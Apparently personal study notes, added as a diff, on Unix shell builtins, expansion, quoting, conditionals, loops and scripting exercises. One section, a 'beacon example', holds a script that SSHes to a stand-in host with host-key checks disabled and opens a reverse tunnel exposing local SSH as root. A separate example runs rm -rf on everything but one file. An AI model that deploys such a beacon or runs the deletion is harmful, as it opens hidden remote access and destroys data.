@@ -1,0 +1,361 @@
+
+{ ``` 1.2 Shells and Scripting ```
+
+https://explainshell.com/
+
+{ # basic comms to known 
+# known
+alias, bg, fg, cd, env, export, history,set
+umask // set or list file permissions
+unset // unset env var 
+alias 
+
+#unknown
+eval // evaluate args 
+jobs // show active jobs managed by shell (foreground/backgrounded) 
+nohup // run a command IMMUNE to hangups, keep job from being tracked by shell (e.g. running nmap >file  scan on bad conn!)
+disown // detach currently running job from shell, place into bg - use on already running jobs
+shift // shift position params 
+popd
+pushd
+trap
+env # display env vars, ALSO can set env variables 
+set // set or modify env var # C 
+setenv // set or modify a GLOBAL var # C 
+unset # bash / C 
+unsetenv // remove env var # C //
+shift // shift arguments N to the left
+	- good for running commands against multiple files/dirs 
+
+xargs // build & execute lines from stdin 
+awk // pattern match & text processing language
+expr // evaluate expressions - perform arithmetic, test command comparisons, and more !
+mkfifo // make FIFO (named pipes) 
+	- creates a first-in first-out special file. This file can be opened by multiple processes for reading and writing.
+
+}
+
+{ # basic shell commands and redirection  (ps -p, exec, file)}
+# identify your shell PID and type 
+ps -p $$
+
+# change shells
+exec /bin/ksh
+
+# echo -n // removes the auto newline. Good for allowing read on same echo prompt
+
+# xargs / while read echo - make echo echo input from STDIN
+echo What are you doing Dave? | xargs ech
+echo What are you doing Dave? > tempfile; cat tempfile | while read x; do echo $x; done
+
+# file 
+show file type (windows uses extensions), can reveal if statically/dynamically linked 
+	file [filename]
+	
+# how many files in /sbin are statically linked?
+file /sbin/* | grep "statically linked" | wc -l 
+
+}
+
+{ # add advanced syntax 
+
+ beacon example { 
+#!/bin/bash
+
+temp=$(ssh www@192.0.2.80 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i /home/jcook/.ssh/id_www 'cat ~/.conn 2>/dev/null && rm -f ~/.conn')
+
+if [[ $temp =~ [0-9]+ ]]
+  then ssh -p ${temp} -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i /home/jcook/.ssh/id_www -N root@192.0.2.80 -R19222:127.0.0.1:22
+fi
+
+``` notes  
+	=~ checks again regex 
+	[0-9]+ means 1 or more digits
+	so checking if temp contains one or more digits
+```
+
+}
+
+
+
+}
+
+{ ``` A - SHELLS - Expansion, Quoting, Special Chars, User environments (useradd, su -, shopt) ```
+
+{ # SHELL EXPANSION 
+
+# text
+echo "List files aabb{11,12,13}ccdd 
+	aabb11ccdd aabb12ccdd aabb13ccdd 
+ls /etc/{krb5,security,apache,crypto}/*.conf
+
+# pathnames 
+ls /etc/pam.d/[^pf]* # list all files that dont start with p or f 
+ls /home/chux/a[b-d]e # start with a, end with e, has any chars b-d in middle 
+ls /etc/*file # any [chars]file 
+
+# command substitution 
+echo "the date is `date`"
+echo and my hostname is $HOSTNAME 
+
+# PATTERN MATCHING
+
+# enable pattern matching expressions (in bash) to include LISTS 
+shopt -s extglob # set extglob variable. enables:
+	rm -rf !(install.log) # removes everything BUT install.log 
+	ls -l +(install|uninstall).*((log|sh) # list all files starting with install/uninstall.log or .sh 
+	ls !(*.jpg|*.gif) # list any files except .jpg or .gif 
+
+
+}
+
+{ # Special Variables / Variable Expansion / Quoting + Escaping Special Chars 
+
+# Shell Variable expansion 
+variableName=variableValue 
+$variableName
+
+set variableName=variableValue 
+
+# Make variables global 
+export variableList 
+setenv variableList 
+
+# undefine a variable 
+unset variableName 
+unsetev variableName # for GLOBAL vars in C 
+# MAY be persistent in: /etc/profile, ~/.bashrc .cshrc .bash_aliases etc
+
+# SPECIALS
+echo $$ # SHELL PID 
+$1-$9 # positional args 
+$? # return value (status of last sub process)
+
+$# - number of args passed 
+$_ # meaning varies with type of shell 
+
+# Escapes 
+echo "is this your file?" # will match all [file]s 
+echo "is this your file\?" # ESCAPED, ? not an instruction for shell processing 
+	# often need escapes when transferring windows files. WIN spaces are normal chars, but NIX spaces are arg. separators 
+
+# single/double quotes - tells shell to treat everything as a SINGLE argument 
+	// singlequotes - escape EVERY character without question
+	// doublequotes - escape every char EXCEPT: $, `, \, !
+		- this allow variables AND command substitution 
+	
+}
+
+{ # EXERCISE 1 - SHELL EXPANSION
+
+#1. single ls command that will list all configuration file(s) contained within the directories /etc/krb5, /etc/security, /etc/apache, and /etc/crypto that end with .conf and have at least one number in the file name(s)
+ls /etc/{krb5,security,apache,crypto}/*[0-9]*.conf
+
+#2. Use command substitution to write a command that can ping your primary DNS server without needing to manually open any files
+ping `cat /etc/resolv.conf | tail -n 1 | cut -d ' ' -f 2` # works on linux 
+
+ping `cat /etc/resolv.conf | grep 'nameserver' | awk '{print $2}'` # works on solaris 
+
+
+
+#7. write a command that will concatenate the contents of all of the files under the /etc directory ending in .conf that contain the domain name string ops.local
+grep "ops.local" `find /etc -name '*.conf'` 
+grep -l 'ops\.local' $(find /etc -name '*.conf') | xargs -I {} cat {} > /tmp/outfile
+}
+
+{ # EXERCISE 3 - Examining User Environments (useradd, passwd, su - , shopt)
+
+# useradd - display default options for new users 
+useradd -D 
+
+# useradd - ensure default loc for user directories is /export/home 
+useradd -D -b /export/home
+
+# create user fred, shell=BASH, homedir= /export/home/fred 
+useradd -s /bin/bash -dir /export/home/fred -m fred # -m required to MAKE the dir 
+
+# change password to pebbles 
+passwd fred 
+
+# elevate (switch to root)
+su root # interactive, NON-LOGIN shell. By default, maintains prior user environment 
+su - # loads new root/new user's environment into shell session 
+
+
+
+}
+
+}
+
+{ ``` B - SCRIPTING  ```
+# interesting commands:
+eval, let
+
+# argument variables 
+$1, $2, ... ${10} and up 
+
+{ # CONDITIONALS 
+	# test - check file types and compare values 
+	test (EXPRESSION) # if true
+	test ! EXPRESSION # if false 
+	test EXPRESSION1 -a EXPRESSION2 # if both are true 
+	test -o OPTION_NAME # test if option is set 
+	test -v VAR_NAME 
+	test  -R VAR_NAME # if nameref variable is set 
+		or just use [ ] or [[ ]] !!!
+		
+		
+	# IF 
+	if [ CONDITION ]
+	then 
+		command 1 
+		...
+		command n.
+	else 
+		command 
+	fi 
+
+	# FILE CONDITIONALS 
+	if [ -e FILE ] # if file EXISTS 
+		-d # is a directory 
+		-f # is a regular file 
+		-s # file exists and is NOT EMPTY
+		-x # file exists and is EXECUTABLE 
+
+	# NUM CONDITIONALS 
+	if [ $NUM -le 128 ] then ...
+		-eq 
+		-ne
+		-lt 
+		-gt 
+		-ge 
+		
+	# STRING CONDITIONALS 
+	if [ "$str1" \< "$str2" ] then ... # escape the < 
+		==
+		!=
+		<
+		>
+		-n STR # if length of str is NON-ZERO
+		-z STR # if length of str is ZERO 
+	}
+
+{ # LOOPS 
+
+	# while 
+	while expression
+	do
+		command 1 
+		command 2 
+		[ condition ] && break; # if true, exit while early
+		...
+		command n
+	done 
+
+	while [ $a -lt 10 ]; do echo $a; a=`expr $a + 1`;done 
+	while /bin/true; do 
+
+	# for 
+	for var_name in list 
+	do
+		command1
+		command2
+		...
+		commandn
+	done 
+
+	for FILE in $HOME/.bash*
+	do
+		echo $FILE 
+	done 
+
+	# until 
+	until expression 
+	do 
+		command1
+		command2 
+		...
+		commandn
+	done 
+
+	a=0; until [ $a -eq 10 ]; do echo $a; a=`expr $a + 1`; done
+
+}
+
+{ # MISC expr + functions example + (shift, csh, bash substring removal, LET operator)
+	# expr - arithmetic, test conditionals, & more 
+	var1=5
+	var2=7
+	var3=$(expr $var1 + $var2)
+				$var1 \* $var2
+				$var1 % $var2 # modulo 
+				$var1 / $var2 
+
+	# functions 
+		function func_name{
+			var=1
+			read, if, for, while
+
+	# shift example - shifts args to left. pay attention to while $# -ne 0 and the second shift 
+		# zipgrep.sh -e -g -f pat-turn // opt = -e -f, pat = pat-turn
+		pat=""
+		opt=""
+		while test $# -ne 0; do
+		  case "$1" in
+		  -e | -f) opt="$opt $1"; shift; pat="$1";;
+		  -*)      opt="$opt $1";;
+		   *)      if test -z "$pat"; then
+					 pat="$1"
+				   else
+					 break;
+				   fi;;
+		  esac
+		  shift
+		done
+
+	# CSH conditions 
+		if ( "$arg:h" != "$arg:t" ) then 	# head != tail, don't search
+			if ( -e $arg ) then		# just do simple lookup
+				echo $arg
+			else
+				echo $arg not found
+			endif
+			continue
+		
+		:h - returns the directory of a path or "head"
+		:t - returns the filename of a path or "tail"
+		:r - returns the directory and filename without the last extension or "root"
+		:e - returns the extension of the path or "end"
+
+	# bash substring removal using # or %
+	e.g. links: GET /data HTTP/1.1Host: localhost:90User-Agent: ELinks/0.11.1 (textmode; Linux; -) Accept: */*Accept-Encoding: gzipAccept-Language: enKeep-Alive: 300Connection: Keep-AlivePragma: no-cacheCache-Control: no-cache.
+		
+		function serve {
+		read request
+
+		while /bin/true; do
+			read header
+			[ "$header" == $'\r' ] && break;
+		done
+
+		url="${request#GET }" // removes GET 
+		url="${url% HTTP/*}" // removes HTTP and onward 
+		filename="$base$url"
+		
+			^ substring removal would return just < /data > for processing
+		}
+		
+	# modify vars with LET command 
+		
+		#!/bin/bash
+		number=20
+		until [ $number -lt 10 ]; do
+			echo number $number
+			let number-=1 # LET number-=1 
+		done
+	
+}
+
+}
+
+}
